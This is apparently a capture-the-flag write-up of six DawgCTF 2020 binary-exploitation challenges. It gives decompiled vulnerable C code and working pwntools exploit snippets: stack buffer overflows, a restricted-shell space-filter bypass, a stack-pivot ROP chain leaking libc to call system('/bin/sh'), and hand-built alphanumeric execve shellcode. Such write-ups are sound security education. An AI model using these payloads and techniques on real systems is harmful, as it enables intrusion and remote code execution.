# DawgCTF

>  Sat, 11 April 2020, 06:00 CST — Mon, 13 April 2020, 06:00 CST

## On Lockdown (50pt)

### Description

> Better than locked up I guess
>
> nc [ctf.umbccd.io](http://ctf.umbccd.io/) 4500
>
> Author: trashcanna


### Attachment

[onlockdown](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/DawgCTF2020/pwn/onlockdown/onlockdown)

### Analysis

In function `lockdown`, flag will be printed  while `local_10` is not `0`:

```c
void lockdown(void){
  char local_50 [64];
  int local_10;
  
  local_10 = 0;
  puts("I made this really cool flag but Governor Hogan put it on lockdown");
  puts("Can you convince him to give it to you?");
  gets(local_50);
  if (local_10 == 0) {
    puts("I am no longer asking. Give me the flag!");
  }
  else {
    flag_me();
  }
  return;
}
```

and here is a buffer overflow obviously: 

```c
gets(local_50);
```

> layout of satck:   local_50[64]   |   local_10

 `local_10` will be overwrite with the values after 64 bytes of our input string.

### Solution

Overwrite `local_10` with nonzero values by buffer overflow:

```python
offset = 65
payload = 'A'*offset
sla('Can you convince him to give it to you?\n',payload)
```


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/DawgCTF2020/pwn/onlockdown)


## Bof of the top (100pt)

### Description

> Anything it takes to climb the ladder of success
>
> nc [ctf.umbccd.io](http://ctf.umbccd.io/) 4000
>
> Author: trashcanna


### Attachment

[bof](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/DawgCTF2020/pwn/bof/bof) & [bof](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/DawgCTF2020/pwn/bof/bof.c)

### Analysis

buffer overflow while `gets(song)` in `get_audition_info`:

```c
void get_audition_info(){
  char name[50];
  char song[50];
  printf("What's your name?\n");
  gets(name);
  printf("What song will you be singing?\n");
  gets(song);
}
```

and we can print flag by calling `audition(1200,366)`:

```c
// gcc -m32 -fno-stack-protector -no-pie bof.c -o bof

void audition(int time, int room_num){
  char* flag = "/bin/cat flag.txt";
  if(time == 1200 && room_num == 366){
    system(flag);
  }
}
```


### Solution

```python
audition = 0x08049182

offset = cyclic_find('daab')
payload = 'A'*offset
payload += p32(audition) + p32(0xdeadbeef) + p32(1200) + p32(366)

sla("What's your name?\n",'TaQini')
sla('What song will you be singing?\n',payload)
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/DawgCTF2020/pwn/bof) 



## Nash (150pt)
### Description

> Welcome to Nash! It's a NoSpaceBash! All you have to do is display the flag. It's right there.
>
> ```
> cat flag.txt
> ```
>
> Oh yeah...you can't use any spaces... Good luck!
>
> nc [ctf.umbccd.io](http://ctf.umbccd.io/) 4600
>
> Author: BlueStar

### Analysis

`spaces` was removed while trying to `cat flag.txt`:

```bash
nash> cat flag.txt
/bin/bash: line 1: catflag.txt: command not found
```

### Solution

We can use `<` to redirect the contents of `flag.txt` to the standard input (`stdin`) of `cat` command.

```bash
nash> cat<flag.txt
DawgCTF{L1k3_H0W_gr3a+_R_sp@c3s_Th0uGh_0mg}
```

### More

We can also download `nash` by following command:

```bash
nash> cat<nash
```

output:

```bash
#!/bin/bash
EXIT="exit"

while [ 1 ]
do
  read -p 'nash> ' input
  echo $input | sed 's/ //g' | sed 's/{//g'| sed 's/}//g' | sed 's/IFS//g' | sed 's/(//g' | sed 's/)//g' | /bin/bash
done
```

We can see `IFS`,`{`,`}`,`(` and `)` in our input were filtered, so `cat$IFSflag.txt` or `cat${IFS}flag.txt` doesn't work.

you can download all files from my [github](https://github.com/TaQini/ctf/tree/master/DawgCTF2020/pwn/nash) 

### Tricks of bash redirections

![](http://image.taqini.space/img/20200411100454.png)

[Reference](https://github.com/pkrumins/bash-redirections-cheat-sheet/blob/master/bash-redirections-cheat-sheet.png)



## Tom Nook the Capitalist Racoon (200pt)

### Description

> Anyone else hear about that cool infinite bell glitch?
>
> nc [ctf.umbccd.io](http://ctf.umbccd.io/) 4400
>
> Author: trashcanna


### Attachment

[animal_crossing](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/DawgCTF2020/pwn/animal_crossing/animal_crossing)

### Analysis

menu:

```
Timmy: Welcome!
How can I help you today?
1. I want to sell
2. What's for sale?
3. See you later.
```

#### I want to sell

list of `I want to sell`:

```
Choice: 1

Of course! What exactly are you
offering?
1. flimsy axe - chop chop chop Price: 800 bells
2. olive flounder - it's looking at me funny Price: 800 bells
3. slingshot - the closest thing you can get to a gun Price: 900 bells
4. flimsy shovel - for digging yourself out of debt Price: 800 bells

```

and the item in list was disappeared after sell:

```
3

Timmy: A slingshot!
Sure! How about if I offer you
900 Bells?
Thank you! Please come again!

1. I want to sell
2. What's for sale?
3. See you later.
Choice: 1

Of course! What exactly are you
offering?
1. flimsy axe - chop chop chop Price: 800 bells
2. olive flounder - it's looking at me funny Price: 800 bells
4. flimsy shovel - for digging yourself out of debt Price: 800 bells

```

#### What's for sale?

list of `What's for sale?`:

```
Timmy: Welcome!
How can I help you today?
1. I want to sell
2. What's for sale?
3. See you later.
Choice: 2

8500 bells
Timmy: Here's what we have to sell today.
1. flimsy net - 400 bells
2. tarantula - 8000 bells
3. slingshot - 900 bells
4. sapling - 640 bells
5. cherry - 400 bells
6. flag - 420000 bells

```

>  show money after choose 2

We don't have enough money to purchase `flag`, but we can buy `tarantula`.

 `tarantula` was added to list of `I want to sell` after we purchase it :

```
2

Timmy: Excellent purchase!
Yes, thank you for the bells
1. I want to sell
2. What's for sale?
3. See you later.
Choice: 1

Of course! What exactly are you
offering?
1. flimsy axe - chop chop chop Price: 800 bells
2. olive flounder - it's looking at me funny Price: 800 bells
3. slingshot - the closest thing you can get to a gun Price: 900 bells
4. flimsy shovel - for digging yourself out of debt Price: 800 bells
5. tarantula - I hate spiders! Price: 8000 bells

```

then try to sell `tarantula`:

```
Timmy: Excellent purchase!
Yes, thank you for the bells
1. I want to sell
2. What's for sale?
3. See you later.
Choice: 1

Of course! What exactly are you
offering?
1. flimsy axe - chop chop chop Price: 800 bells
2. olive flounder - it's looking at me funny Price: 800 bells
3. slingshot - the closest thing you can get to a gun Price: 900 bells
4. flimsy shovel - for digging yourself out of debt Price: 800 bells
5. tarantula - I hate spiders! Price: 8000 bells
5

Timmy: A tarantula!
Sure! How about if I offer you
8000 Bells?
Thank you! Please come again!

1. I want to sell
2. What's for sale?
3. See you later.
Choice: 1

Of course! What exactly are you
offering?
1. flimsy axe - chop chop chop Price: 800 bells
2. olive flounder - it's looking at me funny Price: 800 bells
3. slingshot - the closest thing you can get to a gun Price: 900 bells
4. flimsy shovel - for digging yourself out of debt Price: 800 bells
5. tarantula - I hate spiders! Price: 8000 bells

```

!!! `tarantula` was still in list of `I want to sell` after sold

so we can sell it for many times to earn enough money, then buy the flag

### Solution

```python
# buy tarantula - 8000
sla('Choice: ','2')
sla('6. flag - 420000 bells\n','2')

# sell tarantula 53 times - 8000*53=424000
for i in range(53):
    sla('Choice: ','1')
    sla('5. tarantula - I hate spiders! Price: 8000 bells\n','5')
    print i

# sell 1,2 (make room in pockets)
sla('Choice: ','1')
sla('5. tarantula - I hate spiders! Price: 8000 bells\n','2')
sla('Choice: ','1')
sla('5. tarantula - I hate spiders! Price: 8000 bells\n','1')

# buy flag
sla('Choice: ','2')
sla('6. flag - 420000 bells\n','6')

# print flag
context.log_level = 'debug'
sla('Choice: ','1')
```


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/DawgCTF2020/pwn/animal_crossing) 


## Where we roppin boys? (350pt)

### Description

> Forknife is still a thing right?
>
> nc [ctf.umbccd.io](http://ctf.umbccd.io/) 4100
>
> Author: trashcanna

### Attachment

[rop](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/DawgCTF2020/pwn/rop/rop)

### Analysis

#### buffer overflow

bof in function `tryme` :

```c
undefined4 tryme(void){
  char local_10 [8];
  
  fgets(local_10,0x19,stdin);
  fflush(stdin);
  return 0;
}
```

> 25 bytes copied to `local_10[8]`

![](http://image.taqini.space/img/20200413111414.png)

> only 8 bytes can be overwritten to `esp` 

there was no enough room for args of any function, so we need to enlarge the buffer by stack pivot and then rop attack was available 

### Solution

#### ret2text (fgets)

return to `fgets` so that we can read bytes to `buf` again:

```nasm
   0x80496d1 <tryme+ 7>:    call   0x8049100 <__x86.get_pc_thunk.bx>
   0x80496d6 <tryme+12>:    add    ebx,0x292a
   0x80496dc <tryme+18>:    mov    eax,DWORD PTR [ebx-0x4]
   0x80496e2 <tryme+24>:    mov    eax,DWORD PTR [eax]
   0x80496e4 <tryme+26>:    sub    esp,0x4
   0x80496e7 <tryme+29>:    push   eax
   0x80496e8 <tryme+30>:    push   0x19
   0x80496ea <tryme+32>:    lea    eax,[ebp-0xc]
   0x80496ed <tryme+35>:    push   eax
=> 0x80496ee <tryme+36>:    call   0x8049050 <fgets@plt>
```

> `fgets(ebp-0xc,0x19,stdin);`

#### stack pivot

>  bof cause `ebp` was overwritten, so we should make sure that new `ebp` is an area of readable & writable memory (e.g. `.bss` section)

set `ebp` to `bss+0x200` and overwrite return address with `0x80496d1`(call `fgets`):

```python
ebp = elf.bss()+0x200
# stack pivot
payload = cyclic(12)
payload+= p32(ebp)          # ebp
payload+= p32(0x080496d1)   # return address
payload+= p32(0xdeadbeef)   # padding
```

after that, new address of `buf` was in `.bss` while calling `fgets` again: 

![](http://image.taqini.space/img/20200413121247.png)

now we can puts `ropchain` into new `buf` to start rop attack

#### rop attack

set `ebp` to `buf-4` and execute gadget `leave;ret` to entry `ropchain`:

```python
# rop1
leave = 0x8049712 # leave ; ret
ropchain = p32(elf.sym['puts'])+p32(elf.sym['main'])+p32(elf.got['puts'])
pl2 = ropchain        # (12)
pl2+= p32(ebp-0xc-4)  # ebp (4)
pl2+= p32(leave)      # return address (4)
pl2+= p32(0xdeadbeef) # padding (4)
se(pl2)
```

![](http://image.taqini.space/img/20200413130038.png)

this `ropchain` can leak address of `puts` in libc:

```python
puts = uu32(rc(4))
info_addr('puts',puts)
```

we can calc the base address of libc and then address of other function in libc:

```python
libcbase = puts-libc.sym['puts']
system = libcbase+libc.sym['system']
binsh = libcbase+libc.search('/bin/sh').next()
```

we back to `main` after the first rop attack, so stack pivot again and execute the second `ropchain` 

```python
# stack pivot 
ebp = elf.bss()+0x800
pl3 = cyclic(12)
pl3+= p32(ebp)          # ebp
pl3+= p32(0x080496d1)   # return address
pl3+= p32(0xdeadbeef)   # padding
se(pl3)

# rop2
ropchain = p32(system)+p32(elf.sym['main'])+p32(binsh)
pl4 = ropchain
pl4+= p32(ebp-0xc-4)  # ebp
pl4+= p32(leave)      # return address
pl4+= p32(0xdeadbeef) # padding
se(pl4)
```

> set `ebp` to `bss+0x800` because `system()` need more area of stack

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/DawgCTF2020/pwn/rop) 


## trASCII (450pt)

### Description

> Author: trashcanna @annatea16


### Attachment

[trASCII](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/DawgCTF2020/pwn/trASCII/trASCII)

### Analysis

the program can convert our input into the format of `%c%d`:

```
% ./trASCII
Welcome to trASCII, a program by trashcanna!
We'll take all your random ASCII garbage and convert it into something magical!
What garbage do you have for us today?
ABCDDEEFF
Thanks for the trash! Here's how I compressed it: A1B1C1D2E2F2
```

> `ABCDDEEFF` -> `A1B1C1D2E2F2`

allowed char in our input (from `0` to `z`): 

> ```
> 0123456789:;<=>?@AB
> CDEFGHIJKLMNOPQRSTU
> VWXYZ[\]^_`abcdefgh
> ijklmnopqrstuvwxyz
> ```

#### buffer overflow

```c
  char s[72]; // [esp+10h] [ebp-48h]
  // ...
  fgets(trash, 0x2710, stdin);
  len = strlen(trash);
  // ...
  for ( i = 0; i < (len - 1); ++i ){
    cnt = 1;
    while ( i < (len - 1) && trash[i] == trash[i + 1] ){
      ++cnt;
      ++i;
    }
    if ( trash[i] > 'z' || trash[i] <= '/' ){
      puts("That's not trash, that's recycling");
      exit(-1);
    }
    s[strlen(s) + 1] = 0;
    s[strlen(s)] = trash[i];
    v0 = strlen(s);
    sprintf(&s[v0], "%d", cnt);  // bof here
  }
  memset(trash, 0, 0x2710u);     // clear trash
  strcpy(trash, s);              // copy result to trash
```

The destination buffer(72 bytes) of `sprintf(&s[v0], "%d", cnt)`  is in stack and it will be overflowed while the length of convert result of `trash` is long enough.

Then the return address will be overwritten by the convert result of `trash`

#### executable trash 

Well... the `trash` in this binary in not recyclable but executable...

![](http://image.taqini.space/img/20200413173810.png)

and some address in `trash` ,for example `0x50315934`, can be converted to ascii:

```python
In [1]: from pwn import *

In [2]: addr = 0x50315734

In [3]: p32(addr)
Out[3]: '4W1P'
```

so we can design *ascii shellcode* in `trash` and  *ret2trash* by bof

### Solution

#### ret2trash

Our goal is overwriting return address with `4W1P`  ,so first of all, we should get the offset of bof. 

generate trash by `cyclic(2000)`:

```shell
% cyclic 2000
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabr......
```

send it to the program in `gdb` and watch the return address:

```
   0x80493ce <compact+508>    pop    ebp
 ► 0x80493cf <compact+509>    ret    <0x31753361>
```

>  0x31753361 -> **a3u1**

![](http://image.taqini.space/img/20200413180046.png)

>  we can find the offset by searching `aaau` from trash

Now the return address is overwritten to `a3u1`, but our goal is `4W1P`.

So we should make sure that the first char of return address is a **digit**, not a letter.

the trash should be:

```python
off_ret = '0000000000'+'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasXXXXWP'
```

> ...a3s1X**4W1P**1

send it and watch return address again:

![](http://image.taqini.space/img/20200413181531.png)

> 0x50315734 -> **4W1P**

No problem! We can puts shellcode into `trash+1300` now.

#### ascii shellcode

Use the same method to get the offset of base address of shellcode:

```python
off_shellcode = 
'0000000000'+'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaai'
```

Designing ascii shellcode was a long but interesting process... 

> Reference: [Hacking/Shellcode/Alphanumeric/x86 printable opcodes](https://web.archive.org/web/20110716082827)

Some useful ascii shellcode are as follows:

```python
# h4W1P - push   0x50315734                # + pop eax -> set eax
# 5xxxx - xor    eax, xxxx                 # use xor to generate string
# j1X41 - eax <- 0                         # clear eax
# 1B2   - xor    DWORD PTR [edx+0x32], eax # assign value to shellcode
# 2J2   - xor    cl, BYTE PTR [edx+0x32]   # nop
# 41    - xor al, 0x31                     # nop
# X     - pop    eax
# P     - push   eax
```

And my ascii shellcode is as follows:

```python
# shellcode
nop = 'P5L1U1X3B2'
nop10 = 'P5L1U1X2J2'
shellcode = ''
shellcode+= 'j1X41H40f56b40f57Z40f53G40h4Y1P40Z40Y1B2' # int 0x80 -> [edx+0x32]
shellcode+= 'h1b11X5b1i15b11n2J2H2J2H'+'40h2Z1P40[1C2' # /bin -> [ebx+0x32]
shellcode+= 'h1w11X5w1A151X2P5X118'+'Y1C6Y40' # //sh -> [ebx+0x36]
shellcode+= 'C2K2'*0x32 # inc ebx -> /bin//sh
shellcode+= 'j4X4t' # eax=64
shellcode+= '2J8H'*53 + '2J22K2' # dec eax -> 0xb
shellcode+= nop10*1 
shellcode+= 'P41j1X41P41Y41P41Z41X'+'2K2' # ecx<-0 edx<-0
```

I don't want to explain all the shellcode... you can analyze them by `disasm()`

```python
In [1]: from pwn import *

In [2]: print disasm('h1b11X5b1i15b11n2J2H2J2H')
   0:   68 31 62 31 31          push   0x31316231
   5:   58                      pop    eax
   6:   35 62 31 69 31          xor    eax, 0x31693162
   b:   35 62 31 31 6e          xor    eax, 0x6e313162
  10:   32 4a 32                xor    cl, BYTE PTR [edx+0x32]
  13:   48                      dec    eax
  14:   32 4a 32                xor    cl, BYTE PTR [edx+0x32]
  17:   48                      dec    eax
```

>  see [details](#More) about string generation by ascii shellcode.

#### getshell

Finally call `sys_execve("/bin/sh")` to getshell

![](http://image.taqini.space/img/20200413192057.png)

### More

You can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/DawgCTF2020/pwn/trASCII) 

#### Some techniques

There are some techniques about generating string by ascii shellcode:

Ascii shellcode for generating string is as follows:

| **opcode(in ascii)** | **assembly instructions** |
| :------------------: | :-----------------------: |
|        hxxxx         |         push xxxx         |
|        5xxxx         |       xor eax, xxxx       |
|          X           |          pop eax          |
|          H           |          dec eax          |

#### Example

Example1: generating '`/bin`'

1. List a table of string generated by XOR

| target | **1** | **b** | **i** | **n** |
| ------ | :---- | :---- | :---- | :---- |
| tmp1   | 1     | b     | 1     | 1     |
| tmp2   | b     | 1     | i     | 1     |
| tmp3   | b     | 1     | 1     | n     |

2. set `eax` to `1bin` with ascii shellcode 

| ascii | instructions           |
| :---- | :--------------------- |
| h1b11 | push   0x31316231      |
| X     | pop    eax             |
| 5b1i1 | xor    eax, 0x31693162 |
| 5b11n | xor    eax, 0x6e313162 |

3. generate `/bin  ` from `1bin` 

 ```nasm
           ; eax = 1bin
dec eax    ; eax = 0bin
dec eax    ; eax = /bin
 ```

Example2: generating '`//sh`'

1. List a table of string generated by XOR

| target | **/** | **/** | **s** | **h** |
| :----- | :---- | :---- | :---- | :---- |
| tmp1   | 1     | w     | 1     | P     |
| tmp2   | w     | 1     | A     | 1     |
| tmp3   | 1     | X     | 1     | 8     |
| tmp4   | X     | 1     | 2     | 1     |

2. set `eax` to `//sh` with ascii shellcode 

| ascii | instructions           |
| :---- | :--------------------- |
| h1w11 | push   0x31317731      |
| X     | pop    eax             |
| 5w1A1 | xor    eax, 0x31413177 |
| 51X2P | xor    eax, 0x50325831 |
| 5X118 | xor    eax, 0x38313158 |
